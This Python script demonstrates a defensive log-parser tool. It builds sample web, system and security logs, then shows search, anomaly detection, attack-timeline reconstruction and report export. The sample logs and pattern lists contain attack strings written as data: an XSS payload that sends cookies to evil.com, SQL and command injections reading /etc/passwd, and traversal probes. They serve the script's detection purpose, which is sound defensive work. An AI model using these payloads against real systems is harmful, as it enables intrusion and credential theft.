#!/usr/bin/env python3
"""
Log Parser - Basic Usage Examples
=================================

Comprehensive examples demonstrating the capabilities of the Log Parser tool
for educational purposes and practical log analysis scenarios.

This script provides practical examples of:
- Basic log file analysis with different formats
- Advanced search and filtering operations
- Anomaly detection and security analysis
- Timeline analysis and pattern recognition
- Report generation in multiple formats

Educational Use Only - Ensure proper authorization before analyzing logs.

Author: Samuel Tan
Version: 1.0
License: Educational Use Only
"""

import os
import sys
import json
import tempfile
import time
from datetime import datetime, timedelta

# Add the src directory to path to import log_parser
sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'src'))
from log_parser import LogParser

def create_sample_logs():
    """Create sample log files for demonstration purposes."""
    
    print("[+] Creating sample log files for demonstration...")
    
    # Create temporary directory for sample logs
    temp_dir = tempfile.mkdtemp(prefix='log_parser_examples_')
    
    # Sample Apache access log (Combined format)
    apache_log = os.path.join(temp_dir, 'apache_access.log')
    with open(apache_log, 'w') as f:
        base_time = datetime.now() - timedelta(hours=24)
        
        sample_entries = [
            '192.168.1.100 - - [{}] "GET / HTTP/1.1" 200 2326 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"',
            '192.168.1.101 - - [{}] "GET /admin HTTP/1.1" 401 1234 "-" "Mozilla/5.0 (compatible; security-scanner/1.0)"',
            '10.0.0.50 - - [{}] "POST /login HTTP/1.1" 200 856 "http://example.com/login" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"',
            '192.168.1.102 - - [{}] "GET /../../etc/passwd HTTP/1.1" 404 162 "-" "curl/7.68.0"',
            '203.0.113.45 - - [{}] "GET /search?q=<script>alert(1)</script> HTTP/1.1" 200 4523 "http://google.com" "Mozilla/5.0"',
            '192.168.1.100 - - [{}] "GET /api/users HTTP/1.1" 200 15234 "-" "PostmanRuntime/7.28.4"',
            '10.0.0.25 - - [{}] "GET /uploads/malware.exe HTTP/1.1" 403 0 "-" "Wget/1.20.3"',
            '192.168.1.103 - - [{}] "POST /login HTTP/1.1" 401 234 "-" "python-requests/2.25.1"',
            '198.51.100.10 - - [{}] "GET /robots.txt HTTP/1.1" 404 162 "-" "Googlebot/2.1"',
            '192.168.1.104 - - [{}] "GET /backup.sql HTTP/1.1" 200 50234 "-" "Mozilla/5.0 (suspicious-bot)"'
        ]
        
        for i, entry_template in enumerate(sample_entries):
            timestamp = (base_time + timedelta(minutes=i*15)).strftime('%d/%b/%Y:%H:%M:%S %z')
            if not timestamp.endswith(' +0000'):  # Add timezone if not present
                timestamp += ' +0000'
            entry = entry_template.format(timestamp)
            f.write(entry + '\n')
    
    # Sample Nginx error log
    nginx_log = os.path.join(temp_dir, 'nginx_error.log')
    with open(nginx_log, 'w') as f:
        error_entries = [
            '2024/01/15 10:30:45 [error] 1234#0: *567 connect() failed (111: Connection refused) while connecting to upstream',
            '2024/01/15 10:31:12 [warn] 1234#0: *568 upstream server temporarily disabled while SSL handshaking',
            '2024/01/15 10:32:33 [error] 1234#0: *569 FastCGI sent in stderr: "PHP message: PHP Fatal error: Call to undefined function"',
            '2024/01/15 10:33:01 [crit] 1234#0: *570 SSL_do_handshake() failed (SSL: error:14094416:SSL routines:ssl3_read_bytes:sslv3)',
            '2024/01/15 10:34:15 [alert] 1234#0: worker process 9876 exited on signal 11 (core dumped)'
        ]
        
        for entry in error_entries:
            f.write(entry + '\n')
    
    # Sample system log (syslog format)
    syslog = os.path.join(temp_dir, 'system.log')
    with open(syslog, 'w') as f:
        syslog_entries = [
            'Jan 15 10:25:30 webserver sshd[12345]: Failed password for invalid user admin from 192.168.1.200 port 22 ssh2',
            'Jan 15 10:26:15 webserver sshd[12346]: Failed password for root from 192.168.1.200 port 22 ssh2',
            'Jan 15 10:27:03 webserver kernel: iptables: dropped packet: IN=eth0 OUT= SRC=10.0.0.100 DST=192.168.1.10',
            'Jan 15 10:28:45 webserver httpd: segfault at 7f8b2c000000 ip 00007f8b2c123456 sp 00007fff12345678',
            'Jan 15 10:29:12 webserver postfix/smtpd[9876]: NOQUEUE: reject: RCPT from unknown[203.0.113.100]'
        ]
        
        for entry in syslog_entries:
            f.write(entry + '\n')
    
    # Sample security log with various attack patterns
    security_log = os.path.join(temp_dir, 'security.log')
    with open(security_log, 'w') as f:
        security_entries = [
            '2024-01-15 10:35:22 INFO [192.168.1.105] Normal user login successful',
            '2024-01-15 10:36:45 WARN [203.0.113.50] Multiple failed login attempts detected',
            '2024-01-15 10:37:12 ALERT [10.0.0.75] SQL injection attempt: "SELECT * FROM users WHERE id=1 UNION SELECT password FROM admin"',
            '2024-01-15 10:38:33 ALERT [198.51.100.25] XSS attempt detected: "<script>document.location=\\"http://evil.com\\"+document.cookie</script>"',
            '2024-01-15 10:39:15 WARN [192.168.1.106] Directory traversal attempt: "../../../../etc/passwd"',
            '2024-01-15 10:40:01 ALERT [203.0.113.75] Command injection: "; cat /etc/passwd; ls -la"',
            '2024-01-15 10:41:30 INFO [192.168.1.107] File upload completed successfully',
            '2024-01-15 10:42:18 ALERT [10.0.0.85] Brute force attack detected from multiple IPs',
            '2024-01-15 10:43:45 WARN [198.51.100.30] Suspicious user agent: "sqlmap/1.4.12"',
            '2024-01-15 10:44:22 ALERT [203.0.113.80] Potential data exfiltration: Large file download detected'
        ]
        
        for entry in security_entries:
            f.write(entry + '\n')
    
    print(f"[+] Sample logs created in: {temp_dir}")
    print(f"    - Apache access log: {os.path.basename(apache_log)} ({os.path.getsize(apache_log)} bytes)")
    print(f"    - Nginx error log: {os.path.basename(nginx_log)} ({os.path.getsize(nginx_log)} bytes)")
    print(f"    - System log: {os.path.basename(syslog)} ({os.path.getsize(syslog)} bytes)")
    print(f"    - Security log: {os.path.basename(security_log)} ({os.path.getsize(security_log)} bytes)")
    
    return {
        'temp_dir': temp_dir,
        'apache_log': apache_log,
        'nginx_log': nginx_log,
        'syslog': syslog,
        'security_log': security_log
    }

def example_1_basic_analysis():
    """
    Example 1: Basic Log File Analysis
    
    Demonstrates:
    - Parsing different log formats
    - Extracting metadata and patterns
    - Basic threat detection
    """
    
    print("\n" + "="*70)
    print("EXAMPLE 1: Basic Log File Analysis")
    print("="*70)
    
    # Create sample logs
    logs = create_sample_logs()
    
    # Initialize log parser
    db_path = os.path.join(logs['temp_dir'], 'analysis.db')
    parser = LogParser(db_path)
    
    print("\n[+] Analyzing Apache access log...")
    
    # Parse Apache access log
    result = parser.parse_log_file(logs['apache_log'], 'apache_combined')
    
    print(f"    Entries parsed: {result['entries_parsed']}")
    print(f"    Entries failed: {result['entries_failed']}")
    print(f"    Parsing time: {result['parsing_time']:.3f}s")
    
    if result['threats_found']:
        print(f"    Threats detected:")
        for threat_type, threats in result['threats_found'].items():
            print(f"      {threat_type}: {len(threats)} instances")
            for threat in threats[:3]:  # Show first 3 instances
                print(f"        - {threat}")
    
    print("\n[+] Analyzing system log...")
    
    # Parse syslog
    result = parser.parse_log_file(logs['syslog'], 'syslog')
    
    print(f"    Entries parsed: {result['entries_parsed']}")
    print(f"    Authentication failures detected: {len([t for threats in result['threats_found'].values() for t in threats if 'failed' in str(t).lower()])}")
    
    print("\n[+] Overall analysis results:")
    print(f"    Total entries processed: {parser.analysis_results['total_entries']}")
    print(f"    Unique IP addresses: {len(parser.analysis_results['top_ips'])}")
    print(f"    Most active IP: {parser.analysis_results['top_ips'].most_common(1)[0] if parser.analysis_results['top_ips'] else 'None'}")
    
    return parser, logs

def example_2_advanced_search():
    """
    Example 2: Advanced Search and Filtering
    
    Demonstrates:
    - Text-based search
    - Regular expression search
    - IP address filtering
    - Status code analysis
    """
    
    print("\n" + "="*70)
    print("EXAMPLE 2: Advanced Search and Filtering")
    print("="*70)
    
    # Use parser from previous example or create new one
    try:
        # Try to reuse existing parser
        parser = example_2_advanced_search.parser
        logs = example_2_advanced_search.logs
    except AttributeError:
        parser, logs = example_1_basic_analysis()
    
    print("\n[+] Searching for failed authentication attempts...")
    
    # Search for failed login attempts
    failed_logins = parser.search_logs("failed", "text")
    print(f"    Found {len(failed_logins)} entries containing 'failed'")
    
    for entry in failed_logins[:3]:  # Show first 3 results
        print(f"    - {entry['timestamp']}: {entry['raw_entry'][:80]}...")
    
    print("\n[+] Searching for suspicious IP addresses...")
    
    # Search for specific IP patterns (potential attackers)
    suspicious_ips = ['192.168.1.200', '203.0.113.50', '10.0.0.75']
    
    for ip in suspicious_ips:
        results = parser.search_logs(ip, "ip")
        if results:
            print(f"    IP {ip}: {len(results)} requests")
            for result in results[:2]:  # Show first 2 requests
                status = result.get('status_code', 'Unknown')
                url = result.get('url', 'Unknown')
                print(f"      [{status}] {url}")
    
    print("\n[+] Analyzing error patterns...")
    
    # Search for different HTTP error codes
    error_codes = ['404', '401', '403', '500']
    
    for code in error_codes:
        results = parser.search_logs(code, "status")
        if results:
            print(f"    HTTP {code} errors: {len(results)} occurrences")
    
    print("\n[+] Regular expression search for SQL injection patterns...")
    
    # Search for SQL injection attempts using regex
    sql_patterns = [
        r"union.*select",
        r"or.*1\s*=\s*1",
        r"drop.*table"
    ]
    
    total_sql_attempts = 0
    for pattern in sql_patterns:
        try:
            results = parser.search_logs(pattern, "regex")
            if results:
                total_sql_attempts += len(results)
                print(f"    Pattern '{pattern}': {len(results)} matches")
        except:
            # Regex might not be supported in all SQLite installations
            print(f"    Pattern '{pattern}': regex search not supported")
    
    if total_sql_attempts > 0:
        print(f"    Total SQL injection attempts detected: {total_sql_attempts}")
    
    # Store for potential reuse
    example_2_advanced_search.parser = parser
    example_2_advanced_search.logs = logs
    
    return parser, logs

def example_3_anomaly_detection():
    """
    Example 3: Anomaly Detection and Statistical Analysis
    
    Demonstrates:
    - Statistical anomaly detection
    - Traffic pattern analysis
    - Behavioral anomaly identification
    - Security event correlation
    """
    
    print("\n" + "="*70)
    print("EXAMPLE 3: Anomaly Detection and Statistical Analysis")
    print("="*70)
    
    # Use parser from previous example or create new one
    try:
        parser = example_3_anomaly_detection.parser
        logs = example_3_anomaly_detection.logs
    except AttributeError:
        parser, logs = example_1_basic_analysis()
        # Add security log for more interesting anomalies
        parser.parse_log_file(logs['security_log'], 'custom')
    
    print("\n[+] Running statistical anomaly detection...")
    
    # Detect statistical anomalies
    anomalies = parser.detect_anomalies('statistical')
    
    print(f"    Total anomalies detected: {len(anomalies)}")
    
    # Categorize anomalies by severity
    high_severity = [a for a in anomalies if a['details'].get('severity') == 'HIGH']
    medium_severity = [a for a in anomalies if a['details'].get('severity') == 'MEDIUM']
    low_severity = [a for a in anomalies if a['details'].get('severity') == 'LOW']
    
    print(f"    High severity: {len(high_severity)}")
    print(f"    Medium severity: {len(medium_severity)}")
    print(f"    Low severity: {len(low_severity)}")
    
    print("\n[+] Detailed anomaly analysis:")
    
    for anomaly in anomalies[:5]:  # Show first 5 anomalies
        severity = anomaly['details'].get('severity', 'UNKNOWN')
        category = anomaly['category']
        description = anomaly['description']
        
        print(f"    [{severity}] {category}: {description}")
        
        # Show additional details if available
        if 'ip_address' in anomaly['details']:
            print(f"        IP Address: {anomaly['details']['ip_address']}")
        if 'request_count' in anomaly['details']:
            print(f"        Request Count: {anomaly['details']['request_count']}")
        if 'z_score' in anomaly['details']:
            print(f"        Z-Score: {anomaly['details']['z_score']}")
    
    print("\n[+] IP address behavior analysis:")
    
    # Analyze top IP addresses for suspicious behavior
    top_ips = parser.analysis_results['top_ips'].most_common(5)
    
    for ip, count in top_ips:
        print(f"    {ip}: {count} requests")
        
        # Check if this IP has diverse status codes (potential scanning)
        ip_entries = parser.search_logs(ip, "ip")
        if ip_entries:
            status_codes = [entry.get('status_code') for entry in ip_entries if entry.get('status_code')]
            unique_statuses = len(set(status_codes))
            
            if unique_statuses > 3:
                print(f"      [!] Suspicious: {unique_statuses} different status codes (potential scanning)")
            
            # Check for rapid requests (potential bot behavior)
            if count > 5:
                print(f"      [!] High volume: {count} requests (potential automated activity)")
    
    print("\n[+] Running behavioral anomaly detection...")
    
    # Detect behavioral anomalies
    behavioral_anomalies = parser.detect_anomalies('behavioral')
    
    for anomaly in behavioral_anomalies:
        if anomaly['type'] == 'behavioral':
            print(f"    {anomaly['category']}: {anomaly['description']}")
            if 'user_agent' in anomaly['details']:
                print(f"        User Agent: {anomaly['details']['user_agent'][:60]}...")
    
    # Store for potential reuse
    example_3_anomaly_detection.parser = parser
    example_3_anomaly_detection.logs = logs
    
    return parser, logs

def example_4_timeline_analysis():
    """
    Example 4: Timeline Analysis and Pattern Recognition
    
    Demonstrates:
    - Timeline generation and analysis
    - Temporal pattern detection
    - Event correlation over time
    - Attack timeline reconstruction
    """
    
    print("\n" + "="*70)
    print("EXAMPLE 4: Timeline Analysis and Pattern Recognition")
    print("="*70)
    
    # Use parser from previous example or create new one
    try:
        parser = example_4_timeline_analysis.parser
        logs = example_4_timeline_analysis.logs
    except AttributeError:
        parser, logs = example_1_basic_analysis()
        # Parse additional logs for timeline analysis
        parser.parse_log_file(logs['security_log'], 'custom')
        parser.parse_log_file(logs['nginx_log'], 'custom')
    
    print("\n[+] Generating timeline analysis...")
    
    # Generate timeline
    timeline = parser.generate_timeline_analysis()
    
    print(f"    Total timepoints analyzed: {timeline['total_timepoints']}")
    
    if timeline['time_range']:
        print(f"    Time range: {timeline['time_range']['start']} to {timeline['time_range']['end']}")
    
    print("\n[+] Hourly activity distribution:")
    
    # Display hourly distribution
    hourly_data = timeline['hourly_distribution']
    if hourly_data:
        sorted_hours = sorted(hourly_data.items())
        max_count = max(hourly_data.values()) if hourly_data.values() else 1
        
        for hour, count in sorted_hours:
            if count > 0:
                # Create simple ASCII bar chart
                bar_length = int((count / max_count) * 30)
                bar = '#' * bar_length
                print(f"    {hour:02d}:00 [{count:3d}] {bar}")
    
    print("\n[+] Status code timeline analysis:")
    
    # Analyze status code patterns over time
    status_timeline = timeline['status_timeline']
    
    for status_code, events in status_timeline.items():
        if events and status_code in ['404', '401', '403', '500']:  # Focus on error codes
            print(f"    HTTP {status_code} events: {len(events)} occurrences")
            
            # Show time distribution
            if len(events) > 1:
                first_event = events[0]['timestamp']
                last_event = events[-1]['timestamp']
                print(f"        Time span: {first_event} to {last_event}")
                
                # Calculate event frequency
                total_count = sum(event['count'] for event in events)
                avg_per_event = total_count / len(events)
                print(f"        Average per occurrence: {avg_per_event:.1f}")
    
    print("\n[+] Attack timeline reconstruction:")
    
    # Try to correlate security events chronologically
    security_events = []
    
    # Search for various attack patterns with timestamps
    attack_patterns = [
        ('SQL Injection', ['union', 'select', 'drop table']),
        ('XSS Attack', ['<script>', 'javascript:', 'alert(']),
        ('Directory Traversal', ['../', '....///']),
        ('Brute Force', ['failed login', 'authentication failure']),
        ('Command Injection', ['; cat', '| ls', '&& wget'])
    ]
    
    for attack_type, patterns in attack_patterns:
        for pattern in patterns:
            results = parser.search_logs(pattern.lower(), "text")
            for result in results:
                if result.get('timestamp'):
                    security_events.append({
                        'timestamp': result['timestamp'],
                        'type': attack_type,
                        'pattern': pattern,
                        'ip': result.get('ip_address', 'Unknown'),
                        'entry': result['raw_entry'][:100]
                    })
    
    # Sort by timestamp and display attack timeline
    if security_events:
        # Simple timestamp sorting (works for most formats)
        security_events.sort(key=lambda x: x['timestamp'])
        
        print(f"    Reconstructed attack timeline ({len(security_events)} events):")
        
        for event in security_events[:10]:  # Show first 10 events
            print(f"        [{event['timestamp']}] {event['type']} from {event['ip']}")
            print(f"            Pattern: {event['pattern']}")
            print(f"            Entry: {event['entry']}...")
            print()
    
    # Store for potential reuse
    example_4_timeline_analysis.parser = parser
    example_4_timeline_analysis.logs = logs
    
    return parser, logs

def example_5_comprehensive_reporting():
    """
    Example 5: Comprehensive Reporting and Export
    
    Demonstrates:
    - Multi-format report generation
    - Data export capabilities
    - Summary statistics compilation
    - Professional report formatting
    """
    
    print("\n" + "="*70)
    print("EXAMPLE 5: Comprehensive Reporting and Export")
    print("="*70)
    
    # Use parser from previous examples or create new one
    try:
        parser = example_5_comprehensive_reporting.parser
        logs = example_5_comprehensive_reporting.logs
    except AttributeError:
        parser, logs = example_1_basic_analysis()
        # Parse all log files for comprehensive analysis
        parser.parse_log_file(logs['security_log'], 'custom')
        parser.parse_log_file(logs['nginx_log'], 'custom')
        
        # Run anomaly detection for complete analysis
        parser.detect_anomalies('all')
    
    print("\n[+] Generating comprehensive analysis reports...")
    
    # Create reports directory
    reports_dir = os.path.join(logs['temp_dir'], 'reports')
    os.makedirs(reports_dir, exist_ok=True)
    
    # Generate JSON report
    print("\n[+] Generating JSON report...")
    json_report = os.path.join(reports_dir, 'analysis_report.json')
    parser.generate_report('json', json_report)
    
    json_size = os.path.getsize(json_report)
    print(f"    JSON report saved: {json_report}")
    print(f"    File size: {json_size} bytes ({json_size/1024:.1f} KB)")
    
    # Generate CSV report
    print("\n[+] Generating CSV report...")
    csv_report = os.path.join(reports_dir, 'analysis_report.csv')
    parser.generate_report('csv', csv_report)
    
    csv_size = os.path.getsize(csv_report)
    print(f"    CSV report saved: {csv_report}")
    print(f"    File size: {csv_size} bytes ({csv_size/1024:.1f} KB)")
    
    # Generate HTML report
    print("\n[+] Generating HTML report...")
    html_report = os.path.join(reports_dir, 'analysis_report.html')
    parser.generate_report('html', html_report)
    
    html_size = os.path.getsize(html_report)
    print(f"    HTML report saved: {html_report}")
    print(f"    File size: {html_size} bytes ({html_size/1024:.1f} KB)")
    
    print("\n[+] Report summary:")
    print(f"    Total report files: 3")
    print(f"    Combined size: {(json_size + csv_size + html_size)/1024:.1f} KB")
    
    # Display key statistics from the analysis
    print("\n[+] Key analysis statistics:")
    
    results = parser.analysis_results
    
    print(f"    Total log entries processed: {results['total_entries']}")
    print(f"    Unique IP addresses: {len(results['top_ips'])}")
    print(f"    Different status codes: {len(results['status_codes'])}")
    print(f"    Unique user agents: {len(results['top_user_agents'])}")
    
    # Threat summary
    total_threats = sum(len(threats) for threats in results['threats_detected'].values())
    print(f"    Total security threats detected: {total_threats}")
    
    if results['threats_detected']:
        print("    Threat breakdown:")
        for threat_type, threats in results['threats_detected'].items():
            print(f"        {threat_type.replace('_', ' ').title()}: {len(threats)}")
    
    # Anomaly summary
    anomalies = results.get('anomalies', [])
    print(f"    Anomalies detected: {len(anomalies)}")
    
    if anomalies:
        severity_counts = {}
        for anomaly in anomalies:
            severity = anomaly['details'].get('severity', 'Unknown')
            severity_counts[severity] = severity_counts.get(severity, 0) + 1
        
        print("    Anomaly severity distribution:")
        for severity, count in severity_counts.items():
            print(f"        {severity}: {count}")
    
    # Performance metrics
    print("\n[+] Performance metrics:")
    print(f"    Analysis duration: Available in individual parse results")
    print(f"    Memory efficiency: SQLite database used for scalable storage")
    print(f"    Scalability: Supports large log files through streaming analysis")
    
    print(f"\n[+] Report files location: {reports_dir}")
    print("    You can now:")
    print("    - Open the HTML report in a web browser for interactive viewing")
    print("    - Import the CSV report into spreadsheet applications")
    print("    - Use the JSON report for automated processing or integration")
    
    # Display sample of JSON report content
    print("\n[+] Sample JSON report structure:")
    try:
        with open(json_report, 'r') as f:
            report_data = json.load(f)
            
        # Show truncated structure
        sample_structure = {
            'analysis_summary': {
                'total_entries_analyzed': report_data.get('analysis_summary', {}).get('total_entries_analyzed', 0),
                'threats_detected': report_data.get('analysis_summary', {}).get('threats_detected', 0),
                'anomalies_found': report_data.get('analysis_summary', {}).get('anomalies_found', 0)
            },
            'traffic_analysis': {
                'top_ip_count': len(report_data.get('traffic_analysis', {}).get('top_ip_addresses', {})),
                'status_codes_tracked': len(report_data.get('traffic_analysis', {}).get('status_code_distribution', {}))
            }
        }
        
        print(json.dumps(sample_structure, indent=2))
        
    except Exception as e:
        print(f"    Error reading JSON report: {e}")
    
    # Store for potential reuse
    example_5_comprehensive_reporting.parser = parser
    example_5_comprehensive_reporting.logs = logs
    
    return parser, logs, reports_dir

def cleanup_examples(logs_info):
    """Clean up temporary files created during examples."""
    
    print(f"\n[+] Cleaning up temporary files...")
    
    try:
        import shutil
        shutil.rmtree(logs_info['temp_dir'])
        print(f"    Temporary directory removed: {logs_info['temp_dir']}")
    except Exception as e:
        print(f"    Warning: Could not remove temporary directory: {e}")
        print(f"    Manual cleanup may be required: {logs_info['temp_dir']}")

def main():
    """
    Main function demonstrating all log parser capabilities.
    
    This comprehensive demonstration covers:
    1. Basic log file analysis and parsing
    2. Advanced search and filtering operations  
    3. Anomaly detection and statistical analysis
    4. Timeline analysis and pattern recognition
    5. Comprehensive reporting and export
    """
    
    print("Log Parser - Comprehensive Usage Examples")
    print("=" * 70)
    print("Educational demonstration of intelligent log analysis capabilities")
    print("Version: 1.0 | Author: Samuel Tan")
    print("=" * 70)
    
    start_time = time.time()
    
    try:
        # Run all examples in sequence
        print("\nRunning comprehensive log analysis examples...")
        
        # Example 1: Basic Analysis
        parser1, logs = example_1_basic_analysis()
        
        # Example 2: Advanced Search  
        example_2_advanced_search.parser = parser1
        example_2_advanced_search.logs = logs
        parser2, logs = example_2_advanced_search()
        
        # Example 3: Anomaly Detection
        example_3_anomaly_detection.parser = parser2
        example_3_anomaly_detection.logs = logs
        parser3, logs = example_3_anomaly_detection()
        
        # Example 4: Timeline Analysis
        example_4_timeline_analysis.parser = parser3
        example_4_timeline_analysis.logs = logs
        parser4, logs = example_4_timeline_analysis()
        
        # Example 5: Comprehensive Reporting
        example_5_comprehensive_reporting.parser = parser4
        example_5_comprehensive_reporting.logs = logs
        parser5, logs, reports_dir = example_5_comprehensive_reporting()
        
        # Final summary
        execution_time = time.time() - start_time
        
        print("\n" + "="*70)
        print("EXAMPLES COMPLETED SUCCESSFULLY")
        print("="*70)
        
        print(f"\nExecution Summary:")
        print(f"    Total execution time: {execution_time:.2f} seconds")
        print(f"    Log entries processed: {parser5.analysis_results['total_entries']}")
        print(f"    Security threats detected: {sum(len(t) for t in parser5.analysis_results['threats_detected'].values())}")
        print(f"    Anomalies found: {len(parser5.analysis_results.get('anomalies', []))}")
        print(f"    Reports generated: 3 (JSON, CSV, HTML)")
        
        print(f"\nGenerated Files:")
        print(f"    Sample logs: {logs['temp_dir']}")
        print(f"    Analysis database: {logs['temp_dir']}/analysis.db")
        print(f"    Reports directory: {reports_dir}")
        
        print(f"\nEducational Objectives Achieved:")
        print("    [+] Log parsing and format detection")
        print("    [+] Pattern recognition and threat detection")
        print("    [+] Statistical and behavioral anomaly detection")
        print("    [+] Timeline analysis and event correlation")
        print("    [+] Multi-format reporting and data export")
        print("    [+] Database integration and scalable storage")
        
        print(f"\nNext Steps:")
        print("    - Analyze your own log files using the techniques demonstrated")
        print("    - Customize threat detection patterns for your environment")
        print("    - Integrate with existing security monitoring systems")
        print("    - Explore the web interface for interactive analysis")
        
        # Ask user about cleanup
        try:
            cleanup_choice = input(f"\nClean up temporary files? (y/N): ").strip().lower()
            if cleanup_choice in ['y', 'yes']:
                cleanup_examples(logs)
            else:
                print(f"Temporary files preserved at: {logs['temp_dir']}")
        except KeyboardInterrupt:
            print(f"\nTemporary files preserved at: {logs['temp_dir']}")
        
    except KeyboardInterrupt:
        print(f"\n\n[!] Examples interrupted by user")
        print(f"Partial results may be available in temporary directory")
        
    except Exception as e:
        print(f"\n[!] Error during examples execution: {e}")
        print(f"This is an educational tool - some features may need adjustment")
        print(f"for your specific environment or log formats.")
        
        import traceback
        traceback.print_exc()
    
    print(f"\n" + "="*70)
    print("Log Parser Examples - Educational Use Only")
    print("Ensure proper authorization before analyzing production logs")
    print("="*70)

if __name__ == "__main__":
    main()